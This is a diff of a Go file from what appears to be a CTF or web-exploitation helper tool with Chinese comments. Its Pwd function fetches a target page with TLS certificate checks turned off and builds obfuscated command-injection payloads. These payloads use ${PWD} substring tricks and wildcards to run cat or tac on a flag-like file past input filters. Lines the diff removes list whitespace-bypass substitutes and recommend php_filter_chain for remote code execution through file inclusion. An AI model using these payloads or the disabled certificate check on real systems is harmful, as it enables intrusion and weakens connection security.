@@ -2,6 +2,7 @@ package script
 
 import (
 	"bufio"
+	"crypto/tls"
 	"fmt"
 	"io"
 	"net/http"
@@ -298,28 +299,39 @@ func Blackshoudong(com string, char string) string {
 
 func Pwd(URL string, canshu string, m string, com string) string {
 
-	response, _ := http.Get(URL)
+	// 自定义 HTTP 客户端，跳过 TLS 证书验证
+	customTransport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: customTransport}
+
+	// 发起请求
+	response, err := client.Get(URL)
+	if err != nil {
+		return "Error fetching URL: " + err.Error()
+	}
 	defer response.Body.Close()
-	doc, _ := io.ReadAll(response.Body)
+
+	// 读取响应体
+	doc, err := io.ReadAll(response.Body)
+	if err != nil {
+		return "Error reading response body: " + err.Error()
+	}
+
 	yuanma := RemoveHTMLTags(string(doc))
 
 	xiexian := "${PWD::${##}}"
 	t := "${PWD:${##}${#}:${##}}"
 
 	var command string
-	kongge := []string{"%0a", "%09", "{$IFS}", " ", "$IFS$9", "$IFS", "%0d", "<", "<>"}
 
 	if strings.Contains(com, "cat") {
 
-		for _, kong := range kongge {
-			command = xiexian + "???" + xiexian + "??" + t + kong + "????.???"
-		}
+		command = xiexian + "???" + xiexian + "??" + t + " " + "????.???"
 
 	} else if strings.Contains(com, "tac") {
 
-		for _, kong := range kongge {
-			command = xiexian + "???" + xiexian + t + "??" + kong + "????.???"
-		}
+		command = xiexian + "???" + xiexian + t + "??" + " " + "????.???"
 
 	}
 
@@ -535,65 +547,3 @@ func Weixieyi(URL string, guolv string, canshu string, m string, command string,
 	}
 	return "error"
 }
-
-//首先推荐php-filter-chain
-
-/*response, _ := http.Get(URL)
-defer response.Body.Close()
-doc, _ := io.ReadAll(response.Body)
-yuanma := RemoveHTMLTags(string(doc))
-
-fakehanshu := []string{"include","require","include_once","require_once","highlight_file","show_source","file_get_contents","fopen","file","readfile"}
-
-for _, hanshu := range fakehanshu {
-
-	if strings.Contains(yuanma, hanshu) {
-
-		fmt.Println("可以使用伪协议")
-
-		if guolv == "" {
-			fmt.Println("这是一个没有过滤的函数，这里推荐一个php_filter_chain.py，可以直接rce")
-		} else {
-
-			re := regexp.MustCompile(fmt.Sprintf(`%s\((.*?)\)`, hanshu))
-
-			for _, lin := range yuanma {
-				line := string(lin)
-
-				if strings.Contains(line, hanshu) {
-					match := re.FindStringSubmatch(line)
-					if len(match) > 1 {
-						content := match[1]
-						fmt.Printf("Extracted content: %s\n", content)
-
-						// 处理圆括号内的内容，并分隔逗号
-						parts := strings.Split(content, ",")
-						for _, part := range parts {
-							part = strings.TrimSpace(part) // 去除前后空格
-							fmt.Printf("Argument: %s\n", part)
-						}
-					}
-				}
-			}
-		}
-
-	}
-}*/
-
-/*
-re := regexp.MustCompile(`include\((.*?)\)`)
-if strings.Contains(line, "include") {
-			match := re.FindStringSubmatch(line)
-			if len(match) > 1 {
-				content := match[1]
-				fmt.Printf("Extracted content: %s\n", content)
-
-				// 处理圆括号内的内容，并分隔逗号
-				parts := strings.Split(content, ",")
-				for i, part := range parts {
-					part = strings.TrimSpace(part) // 去除前后空格
-					fmt.Printf("Argument %d: %s\n", i+1, part)
-				}
-			}
-		}
-*/
